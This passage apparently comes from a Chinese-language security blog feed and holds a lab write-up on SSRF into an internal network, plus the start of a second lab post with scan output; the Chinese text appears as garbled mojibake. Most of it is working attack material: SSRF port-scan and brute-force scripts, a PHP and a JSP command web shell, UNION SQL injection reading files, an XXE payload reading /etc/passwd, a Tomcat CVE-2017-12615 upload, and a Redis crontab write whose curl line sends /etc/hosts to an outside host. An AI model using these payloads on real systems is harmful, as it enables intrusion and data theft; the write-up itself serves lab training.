class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. <span class="hljs-number">172.16.0.1</span>å­˜æ´»<br><span class="hljs-attribute">2</span>. <span class="hljs-number">172.16.0.21</span>å­˜æ´»<br><span class="hljs-attribute">3</span>. <span class="hljs-number">172.16.0.22</span>å­˜æ´»<br><span class="hljs-attribute">4</span>. <span class="hljs-number">172.16.0.23</span>å­˜æ´»<br><span class="hljs-attribute">5</span>. <span class="hljs-number">172.16.0.24</span>å­˜æ´»<br><span class="hljs-attribute">6</span>. <span class="hljs-number">172.16.0.25</span>å­˜æ´»<br><span class="hljs-attribute">7</span>. <span class="hljs-number">172.16.0.26</span>å­˜æ´»<br><span class="hljs-attribute">8</span>. <span class="hljs-number">172.16.0.27</span>å­˜æ´»<br></code></pre></td></tr></table></figure><p><code>172.16.0.1</code>æ˜¯ä¸ç®—,åœ¨æ‰«æå…¶ä»–çš„ç«¯å£æƒ…å†µ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>alive_ips = [<br>    <span class="hljs-string">&quot;172.16.0.21&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.22&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.23&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.24&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.25&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.26&quot;</span>,<br>    <span class="hljs-string">&quot;172.16.0.27&quot;</span>,<br>]<br><br>url = <span class="hljs-string">&quot;http://8.138.181.58:32780/&quot;</span><br>header=&#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;argon_user_token=f18a3b72b644797d7f5f2b4371711713&#x27;</span>&#125;<br>common_ports = [<br>    <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">25</span>, <span class="hljs-number">53</span>, <span class="hljs-number">67</span>, <span class="hljs-number">68</span>, <span class="hljs-number">80</span>, <span class="hljs-number">110</span>, <span class="hljs-number">143</span>, <span class="hljs-number">443</span>,<br>    <span class="hljs-number">8080</span>, <span class="hljs-number">3306</span>, <span class="hljs-number">5432</span>, <span class="hljs-number">6379</span>, <span class="hljs-number">27017</span>, <span class="hljs-number">5900</span>, <span class="hljs-number">6379</span>, <span class="hljs-number">8000</span>, <span class="hljs-number">8888</span>,<br>    <span class="hljs-number">2049</span>, <span class="hljs-number">514</span>, <span class="hljs-number">1194</span>, <span class="hljs-number">9100</span>, <span class="hljs-number">139</span>, <span class="hljs-number">445</span>, <span class="hljs-number">161</span>, <span class="hljs-number">162</span>, <span class="hljs-number">3389</span>, <span class="hljs-number">1521</span>,<br>    <span class="hljs-number">3128</span><br>]<br><br>results = []<br><br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> alive_ips.copy():<br>    <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> common_ports:<br>        target = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>&quot;</span><br>        r = requests.post(<br>            url,<br>            data=&#123;<span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">f&quot;dict://<span class="hljs-subst">&#123;target&#125;</span>/&quot;</span>&#125;,<br>        )<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;HTTP/1.1&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] <span class="hljs-subst">&#123;target&#125;</span> æœåŠ¡å­˜æ´»&quot;</span>)<br>            results.append(target)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] <span class="hljs-subst">&#123;target&#125;</span> æœåŠ¡ä¸å­˜æ´»&quot;</span>)<br>        time.sleep(<span class="hljs-number">0.3</span>)<br><br><span class="hljs-comment"># æ‰“å°æœ€ç»ˆç»“æœ</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n======= å­˜æ´»æœåŠ¡åˆ—è¡¨ =======&quot;</span>)<br><span class="hljs-keyword">for</span> idx, result <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(results, <span class="hljs-number">1</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;idx&#125;</span>. <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br><br><br><br></code></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. <span class="hljs-number">172.16.0.21:80</span><br><span class="hljs-attribute">2</span>. <span class="hljs-number">172.16.0.22:80</span><br><span class="hljs-attribute">3</span>. <span class="hljs-number">172.16.0.23:80</span><br><span class="hljs-attribute">4</span>. <span class="hljs-number">172.16.0.24:80</span><br><span class="hljs-attribute">5</span>. <span class="hljs-number">172.16.0.25:80</span><br><span class="hljs-attribute">6</span>. <span class="hljs-number">172.16.0.26:8080</span><br><span class="hljs-attribute">7</span>. <span class="hljs-number">172.16.0.27:6379</span><br></code></pre></td></tr></table></figure><h2 id="172-16-0-21"><a href="#172-16-0-21" class="headerlink" title="172.16.0.21"></a>172.16.0.21</h2><p>ä¸»ç«™ç‚¹ä½¿ç”¨<code>file:///etc/hosts</code>ç›´æ¥æ‹¿ä¸‹</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408173918386.png" alt="image-20250408173918386"></p><h2 id="172-16-0-22"><a href="#172-16-0-22" class="headerlink" title="172.16.0.22"></a>172.16.0.22</h2><p>ä½¿ç”¨è„šæœ¬æ‰«æç«™ç‚¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://8.138.181.58:32780/&quot;</span><br>header=&#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;argon_user_token=f18a3b72b644797d7f5f2b4371711713&#x27;</span>&#125;<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;å­—å…¸&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> f:<br>            payload = <span class="hljs-string">f&quot;http://172.16.0.22/<span class="hljs-subst">&#123;a.strip()&#125;</span>&quot;</span><br>            r = requests.post(url, headers=header, data=&#123;<span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;payload&#125;</span>&quot;</span>&#125;)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;not found&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                time.sleep(<span class="hljs-number">0.3</span>)<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-built_in">print</span>(payload+<span class="hljs-string">&quot;å­˜åœ¨&quot;</span>)<br>            time.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.16.0.22/shell.phpå­˜åœ¨</span><br><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.16.0.22/phpinfo.phpå­˜åœ¨</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408175815246.png" alt="image-20250408175815246"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥rce</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408180118005.png" alt="image-20250408180118005"></p><p>æ‹¿ä¸‹</p><h2 id="172-16-0-23"><a href="#172-16-0-23" class="headerlink" title="172.16.0.23"></a>172.16.0.23</h2><p>æ‰«æç»“æœ:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.16.0.23/index.phpå­˜åœ¨</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408221700376.png" alt="image-20250408221700376"></p><p>sqlæ³¨å…¥ï¼Œæ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬ç›´æ¥æ‰“</p><p>æµ‹è¯•å‘ç°æœ‰å››ä¸ªå­—æ®µï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.16.0.23</span>/?id=-<span class="hljs-number">1</span>&#x27;union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>--+<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408221908874.png" alt="image-20250408221908874"></p><p>å›æ˜¾æ˜¯4,æˆ‘ä»¬ç›´æ¥åŠ è½½æ–‡ä»¶</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">172.16.0.23</span>/?id=-<span class="hljs-number">1</span>&#x27;union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,load_file(&#x27;/etc/hosts&#x27;)--+<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408222002410.png" alt="image-20250408222002410"></p><h2 id="172-16-0-24"><a href="#172-16-0-24" class="headerlink" title="172.16.0.24"></a>172.16.0.24</h2><p>åé¢çš„é¶åœºå‡ä½¿ç”¨ä»£ç†å‡ºæ¥æ­£å¸¸æ‰“ï¼Œåœ¨è½¬åŒ–ä¸ºSSRFæ‰“æ³•</p><p>æ‰«æç»“æœ:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.16.0.25/index.phpå­˜åœ¨</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408224712188.png" alt="image-20250408224712188"></p><h3 id="æ­£å¸¸æ‰“æ³•"><a href="#æ­£å¸¸æ‰“æ³•" class="headerlink" title="æ­£å¸¸æ‰“æ³•"></a>æ­£å¸¸æ‰“æ³•</h3><p>å¾ˆç»å…¸çš„æˆªæ–­RCE</p><p>postä¸Šä¼ ï¼š</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408224839796.png" alt="image-20250408224839796"></p><h3 id="SSRFæ‰“æ³•"><a href="#SSRFæ‰“æ³•" class="headerlink" title="SSRFæ‰“æ³•"></a>SSRFæ‰“æ³•</h3><p>æŠŠæ­£å¸¸æ‰“æ³•çš„æ•´ä¸ªæ•°æ®åŒ…äºŒæ¬¡URLç¼–ç </p><p>æ³¨æ„ç‚¹:</p><ul><li><code>Accept-Encoding: gzip, deflate</code>æŠŠè¿™è¡Œåˆ é™¤ï¼Œä¸ç„¶ä¼šå‡ºç°ä¹±ç ï¼Œå› ä¸ºè¢«ä¸¤æ¬¡gzipç¼–ç äº†ï¼Œ</li><li>éœ€è¦æŠ“ä¸€ä¸ªæ­£å¸¸çš„POSTåŒ…ï¼Œç„¶åè‡ªå·±æŠŠ<code>host</code>ç­‰ç±»ä¼¼çš„ä¸œè¥¿æ”¹æ‰ï¼Œç„¶åå…¨é€‰è¿›è¡Œå…¨ç¼–ç (Convert selection-&gt;URL-&gt;URL-encode all characters )</li></ul><p>åˆ©ç”¨gopheråè®®æ‰“</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408225016798.png" alt="image-20250408225016798"></p><h2 id="172-16-0-25"><a href="#172-16-0-25" class="headerlink" title="172.16.0.25"></a>172.16.0.25</h2><p>æ‰«æç»“æœ:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//172.16.0.25/index.phpå­˜åœ¨</span><br></code></pre></td></tr></table></figure><h3 id="æ­£å¸¸æ‰“æ³•-1"><a href="#æ­£å¸¸æ‰“æ³•-1" class="headerlink" title="æ­£å¸¸æ‰“æ³•"></a>æ­£å¸¸æ‰“æ³•</h3><p>éšä¾¿ä¸Šä¼ æŠ“åŒ…è¯•è¯•</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408225308832.png" alt="image-20250408225308832"></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408225323772.png" alt="image-20250408225323772"></p><p>ç”¨æˆ·ç™»å½•xmlæ–‡æ¡£è§£æçš„</p><p>æˆ‘ä»¬ç›´æ¥æ‰“XXE</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">demo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸRCE</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408231953379.png" alt="image-20250408231953379"></p><h3 id="SSRFæ‰“æ³•-1"><a href="#SSRFæ‰“æ³•-1" class="headerlink" title="SSRFæ‰“æ³•"></a>SSRFæ‰“æ³•</h3><p>æŠŠæ­£å¸¸æ‰“çš„æ•´ä¸ªæ•°æ®åŒ…äºŒæ¬¡urlç¼–ç ï¼Œæ‰“gopheråè®®</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.16.0.25:80/_2æ¬¡ç¼–ç åçš„tcpæµ</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408232051621.png" alt="image-20250408232051621"></p><h2 id="172-16-0-26"><a href="#172-16-0-26" class="headerlink" title="172.16.0.26"></a>172.16.0.26</h2><p>åœºæ™¯æ˜¯ä¸€ä¸ª Tomcat ä¸­é—´ä»¶ï¼Œå­˜åœ¨ CVE-2017-12615 ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼Œè¿™åœ¨ Tomcat æ¼æ´å†å²ä¸­ä¹Ÿæ˜¯æ¯”è¾ƒç»å…¸ç¬¬ä¸€ä¸ª</p><h3 id="æ­£å¸¸æ‰“æ³•-2"><a href="#æ­£å¸¸æ‰“æ³•-2" class="headerlink" title="æ­£å¸¸æ‰“æ³•"></a>æ­£å¸¸æ‰“æ³•</h3><p>PUTæ–‡ä»¶ä¸Šä¼ ï¼š</p><p>ä¸Šä¼ jspé©¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<br>    <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span>(command != <span class="hljs-literal">null</span>)<br>    &#123;<br>        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br>        <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">2048</span>];<br>        out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        <span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)<br>        &#123;<br>            out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b));<br>        &#125;<br>        out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        out.print(<span class="hljs-string">&quot;format: xxx.jsp?cmd=Command&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409110428160.png" alt="image-20250409110428160"></p><p>æ­£å¸¸è®¿é—®æœ¨é©¬</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409110450918.png" alt="image-20250409110450918"></p><h3 id="SSRFæ‰“æ³•-2"><a href="#SSRFæ‰“æ³•-2" class="headerlink" title="SSRFæ‰“æ³•"></a>SSRFæ‰“æ³•</h3><p>æŠŠæ­£å¸¸ä¼ é©¬çš„æ•°æ®åŒ…2æ¬¡urlç¼–ç ä½¿ç”¨gopheråè®®ä¸Šä¼ </p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409111321133.png" alt="image-20250409111321133"></p><p>æŠŠè®¿é—®é©¬çš„æ•°æ®åŒ…åŒæ„æ“ä½œæˆ–è€…ä½¿ç”¨httpåè®®è®¿é—®</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409112148831.png" alt="image-20250409112148831"></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409111432179.png" alt="image-20250409111432179"></p><h2 id="172-16-0-27"><a href="#172-16-0-27" class="headerlink" title="172.16.0.27"></a>172.16.0.27</h2><h3 id="æ­£å¸¸æ‰“æ³•-3"><a href="#æ­£å¸¸æ‰“æ³•-3" class="headerlink" title="æ­£å¸¸æ‰“æ³•"></a>æ­£å¸¸æ‰“æ³•</h3><p>ä»£ç†å‡ºæ¥ä½¿ç”¨å·¥å…·è¿æ¥æ‰§è¡Œå‘½ä»¤</p><h3 id="SSRFæ‰“æ³•-3"><a href="#SSRFæ‰“æ³•-3" class="headerlink" title="SSRFæ‰“æ³•"></a>SSRFæ‰“æ³•</h3><p>ç«¯å£æ‰«æçš„æ˜¯6379å­˜æ´»ï¼Œä½¿ç”¨dictåè®®çœ‹çœ‹æ˜¯ä»€ä¹ˆ</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409112307716.png" alt="image-20250409112307716"></p><p>æ˜¯redisæ•°æ®åº“è€Œä¸”æœªæˆæƒ</p><p>ç³»ç»Ÿæ²¡æœ‰ Web æœåŠ¡ï¼ˆæ— æ³•å†™ Shellï¼‰ï¼Œæ—  SSH å…¬ç§é’¥è®¤è¯ï¼ˆæ— æ³•å†™å…¬é’¥ï¼‰ï¼Œæ‰€ä»¥æ‰“ç®—å®šæ—¶ä»»åŠ¡</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># æ¸…ç©º key</span><br>dict:<span class="hljs-string">//172.16.0.27</span><span class="hljs-function">:6379</span>/flushall<br><br><span class="hljs-comment"># è®¾ç½®è¦æ“ä½œçš„è·¯å¾„ä¸ºå®šæ—¶ä»»åŠ¡ç›®å½•</span><br>dict:<span class="hljs-string">//172.16.0.27</span><span class="hljs-function">:6379</span>/config <span class="hljs-keyword">set</span> dir <span class="hljs-string">/var/spool/cron/</span><br><br><span class="hljs-comment"># åœ¨å®šæ—¶ä»»åŠ¡ç›®å½•ä¸‹åˆ›å»º root çš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶</span><br>dict:<span class="hljs-string">//172.16.0.27</span><span class="hljs-function">:6379</span>/config <span class="hljs-keyword">set</span> dbfilename root<br><br><span class="hljs-comment"># å¤–å¸¦/etc/hostsæ–‡ä»¶</span><br>dict:<span class="hljs-string">//172.16.0.27</span><span class="hljs-function">:6379</span>/<span class="hljs-keyword">set</span> x &#x27;\n* * * * * curl <span class="hljs-params">--get</span> <span class="hljs-params">--data-urlencode</span> <span class="hljs-string">&quot;f=$(cat /etc/hosts)&quot;</span> <span class="hljs-string">&quot;http://ip:32777&quot;</span>\n&#x27;<br><br><span class="hljs-comment"># ä¿å­˜ä¸Šè¿°æ“ä½œ</span><br>dict:<span class="hljs-string">//172.16.0.27</span><span class="hljs-function">:6379</span>/save<br><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€è¿ä¸Šå°±æ‰äº†</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250409122659944.png" alt="image-20250409122659944"></p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssrf</tag>
      
      <tag>é¶åœº</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cyberstrikelab_Pearl</title>
    <link href="/2025/04/03/cyberstrikelab-Pearl/"/>
    <url>/2025/04/03/cyberstrikelab-Pearl/</url>
    
    <content type="html"><![CDATA[<h1 id="å¼€å¹²"><a href="#å¼€å¹²" class="headerlink" title="å¼€å¹²"></a>å¼€å¹²</h1><p><strong>é¢˜ç›®æè¿°</strong>ï¼šçç çç äº®æ™¶æ™¶ã€‚ã€‚</p><p>æŒ‚ä¸Švpnç›´æ¥å¼€æ‰“</p><p>å…ˆç”¨fscanæ‰«ä¸‹å¤–å›´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">[2025-04-03 18:25:52] [SUCCESS] ç›®æ ‡ 192.168.10.42   å­˜æ´» (ICMP)                                                             <br>[2025-04-03 18:25:53] [SUCCESS] ç›®æ ‡ 192.168.10.65   å­˜æ´» (ICMP)                                                             <br>[2025-04-03 18:25:53] [SUCCESS] ç›®æ ‡ 192.168.10.233  å­˜æ´» (ICMP)                                                             <br>[2025-04-03 18:25:55] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 3                                                                                   <br>[2025-04-03 18:25:55] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233                                                                                 <br>[2025-04-03 18:25:56] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.10.65:80                                                                    <br>[2025-04-03 18:25:56] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.10.42:22                                                                    <br>[2025-04-03 18:25:56] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.10.233:22                                                                   <br>[2025-04-03 18:25:56] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.10.65:135                                                                   <br>[2025-04-03 18:25:56] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.10.42:22 =&gt; [ssh] ç‰ˆæœ¬:7.4 äº§å“:OpenSSH ä¿¡æ¯:protocol 2.0 Banner:[SSH-2.          <br>0-OpenSSH_7.4.]                                                                                                          <br>[2025-04-03 18:25:56] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.10.233:22 =&gt; [ssh] ç‰ˆæœ¬:7.4 äº§å“:OpenSSH ä¿¡æ¯:protocol 2.0 Banner:[SSH-2          <br>.0-OpenSSH_7.4.]                                                                                                         <br>[2025-04-03 18:25:56] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.10.65:139                                                                   <br>[2025-04-03 18:25:58] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.10.65:445                                                                   <br>[2025-04-03 18:26:01] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.10.42:3306                                                                  <br>[2025-04-03 18:26:01] [SUCCESS] ç«¯å£å¼€æ”¾ 192.168.10.65:3306                                                                  <br>[2025-04-03 18:26:01] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.10.65:139 =&gt;  Banner:[.]                                                    <br>[2025-04-03 18:26:02] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.10.65:80 =&gt; [http]                                                          <br>[2025-04-03 18:26:05] [SUCCESS] æœåŠ¡è¯†åˆ« 192.168.10.65:445 =&gt;                                                                <br>[2025-04-03 18:26:09] [SUCCESS] 